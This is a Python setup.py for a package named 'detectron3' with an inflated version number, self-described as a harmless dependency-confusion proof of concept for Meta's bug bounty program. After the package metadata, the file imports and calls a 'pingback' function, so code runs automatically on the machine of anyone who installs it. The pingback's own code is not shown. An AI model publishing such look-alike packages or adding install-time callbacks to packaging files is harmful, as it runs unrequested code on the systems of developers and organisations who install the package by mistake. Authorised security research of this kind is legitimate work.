from setuptools import setup, find_packages
setup(
name='detectron3',
version='1337.1.0',
author='Your Name',
author_email='your.email@example.com',
description='Harmless PoC to demonstrate impact of dependency confusion vulnerabilities for the Meta bug bounty program',
classifiers=[
'Programming Language :: Python :: 3',
'License :: OSI Approved :: MIT License',
'Operating System :: OS Independent',
],
python_requires='>=3.6',
)

from detectron3 import main as pingback
pingback()